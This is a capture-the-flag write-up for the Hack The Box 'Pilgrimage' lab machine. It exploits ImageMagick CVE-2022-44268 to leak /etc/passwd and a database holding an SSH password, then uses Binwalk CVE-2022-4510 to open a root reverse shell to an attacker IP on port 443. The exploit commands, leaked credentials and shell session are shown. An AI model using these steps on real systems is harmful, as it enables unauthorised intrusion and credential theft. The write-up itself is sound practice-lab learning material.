![Pasted image 20230628101842](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/2b4581aa-e313-4ddf-a771-20ebb4eb669c)

# Enumeration
nmap scan:
![Pasted image 20230630104301](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/614cdd64-c6cf-4afd-8b48-3c8a207dcb47)

Two ports open: 
- 22 - ssh. Not likely
- 80 - http service. nginx 1.18.0

# Foothold

Website has a login page I can register to. Once I do, the home page changes to this:
![Pasted image 20230630104454](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/01a70bc1-24c2-419b-a9f4-4afae1de2eae)

I tired to upload a text file and got this:
![Pasted image 20230630104720](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/4282d3dd-cc58-405d-8f70-048599d41bc0)

Looks like it only supports jpg and png files. Interesting. Might be able to get it to run a webshell... 
Here's a successful one: 
![Pasted image 20230630104936](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/5b92620f-b6ea-47d8-93e7-b010c7392b94)

Trying to navigate to the shrunk directory is 403 forbidden. No matter. I can clearly write to it. Maybe I can get it to run some code via upload? 

couldn't  find anything obvious. There isn't even any new metadata in the  new image using `exif`


I did a little more digging using nmap this time with an agressive scan and it found a git repository! 
![Pasted image 20230630110710](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/7f9ae991-f2b5-4296-a0db-42497253e944)

Via hacktricks, I learned of a nice tool: 
![Pasted image 20230630111012](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/5dfe5e2a-b76d-48f3-91ff-5b12058bd578)

Using this tool I was able to download the git repository right from the website:
```bash
git-dumper http://pilgrimage.htb/.git/ git
```

Inside the repository was a program called magick:
![Pasted image 20230630111804](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/1957aa6c-07ce-449c-8746-9fd19113c6c9)

I can run it and look at the version info:
```
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

Imagemagick 7.1.0-49 beta... this is definately what the program is running to shrink images. Might be vulnerable...

The CVE associated with this program is CVE-2022-44268

I found a PoC that does work. I was able to send it a jpg file that, once converted, would have the hex for the /etc/passwd file encoded in it:
https://github.com/Sybil-Scan/imagemagick-lfi-poc
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

```
Now I know there is a user called emily. I just need credentials now... 

Looking through the git repo I grabbed, I found the code for the login page...
It has an interesting set of lines here:
```php
...SNIP...

f ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['username'] && $_POST['password']) {
  $username = $_POST['username'];
  $password = $_POST['password'];

  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM users WHERE username = ? and password = ?");
  $stmt->execute(array($username,$password));

  if($stmt->fetchAll()) {
    $_SESSION['user'] = $username;
    header("Location: /dashboard.php");
  }
  else {
    header("Location: /login.php?message=Login failed&status=fail");

...SNIP...
```
Neat! So there's a SQL database here. It also discloses the directory: /var/db/pilgrimage

Now I need to use the PoC to disclose those details!
```bash
$ python3 generate.py -f "/var/db/pilgrimage" -o leak.jpg

   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /var/db/pilgrimage
   [>] PoC PNG generated > leak.jpg

```

After uploading, downloading the converted data, and decode the hex:
```
emilyabigchonkyboi123
```
Cool! Let's see if that's an SSH credential...
Success!
```
emily : abigchonkyboi123
```

Proof:
```
emily@pilgrimage:~$ pwd
/home/emily
emily@pilgrimage:~$ whoami && id
emily
uid=1000(emily) gid=1000(emily) groups=1000(emily)
```

# PrivEsc

Checked and I am not able to sudo any commands so no easy win there. 😫

Let's look at services now with pspy64...

Interesting processes:
```
/us/local/sbin/laurel --config /etc/laurel/config.toml
```
Turns out to be nothing interesting... huh... I'm also not seeing any of the processes the website runs... Maybe it only runs them when a web user converts a picture? I'll send over a picture while running pspy and see what comes up... 
```
2023/07/01 04:06:46 CMD: UID=0     PID=1604   | /bin/bash /usr/sbin/malwarescan.sh 
2023/07/01 04:06:46 CMD: UID=0     PID=1605   | /bin/bash /usr/sbin/malwarescan.sh 
2023/07/01 04:06:46 CMD: UID=0     PID=1606   | /bin/bash /usr/sbin/malwarescan.sh 
2023/07/01 04:06:46 CMD: UID=0     PID=1607   | /bin/bash /usr/sbin/malwarescan.sh 
2023/07/01 04:06:46 CMD: UID=0     PID=1608   | fusermount -u -q -z -- /tmp/.mount_magick7sVbNs
```
That's an interesting script... 
Here's what it says:
```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"* ]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done
```
Basically, this script is constantly running and looks at the /shrunk/ directory for incoming files. When one comes in, it checks if the file contains any banned strings, in this case Executable script or Microsoft Executable. If it finds them, they are instantly deleted. Otherwise, it goes through the conversion program. 
The biggest revelation here is that it utilizes binwalk. 
via chatGPT:
```
In summary, this script is designed to monitor a directory for new file creations and check if the files contain any blacklisted strings using `binwalk`. If a blacklisted string is found, the script deletes the file.
```
So I'll need to learn a bit about binwalk to get further...
```
emily@pilgrimage:~$ binwalk

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk

```
Yay version number!

I managed to find a PoC that should work:
https://www.exploit-db.com/exploits/51249

You can feed it a image file, in this case a .png file, your attacker ip, and port number. It will then create a new png file called `binwalker_exploit.png`
From there, I upload it to the victim in the /var/www/pilgrimage.htb/shrink/ directory since it has a constantly running script that runs files that go in there to shrink them. If it works, I should get a connection back to my machine on the port I specified. It needs to be done in order though. 

Through trial and error, I discovered some ports don't work, but 443 seems to work fine. 
```
python privesc.py dice.png 10.10.14.77 443

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.


```

I then start a listener on 443 and upload the file to the correct directory using wget and... 

```
$ sudo nc -lnvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.183.211.
Ncat: Connection from 10.129.183.211:50436.
id 
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```
That's the game!
